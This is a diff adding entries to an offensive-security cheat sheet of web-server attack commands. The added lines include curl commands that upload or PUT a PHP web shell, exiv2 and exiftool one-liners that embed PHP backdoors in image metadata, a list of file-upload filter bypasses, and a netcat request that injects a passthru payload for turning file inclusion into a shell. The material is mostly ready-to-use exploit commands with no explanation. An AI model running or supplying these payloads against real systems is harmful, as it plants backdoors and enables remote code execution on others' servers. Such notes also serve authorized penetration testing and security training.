@@ -236,8 +236,36 @@ https://www.ired.team/offensive-security-experiments/offensive-security-cheetshe
 
 
 https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#uploading-posting-files-through-www-upload-forms
+
 #### POST file
 curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"
 
 ### POST binary data to web form
 curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
+
+### PUTing File on the Webhost via PUT verb
+curl -X PUT -d '<?php system($_GET["c"]);?>' http://$target/shell.php
+
+### Injecting PHP into JPEG
+```
+exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
+exiftool “-comment<=back.php” back.png
+```
+
+### Bypassing File Upload Restrictions
+```
+file.php -> file.jpg
+file.php -> file.php.jpg
+file.asp -> file.asp;.jpg
+file.gif (contains php code, but starts with string GIF/GIF98)
+00%
+file.jpg with php backdoor in exif (see below)
+.jpg -> proxy intercept -> rename to .php
+```
+### Local File Inclusion to Shell
+```
+nc $target 80
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: $target
+Connection: close
+```
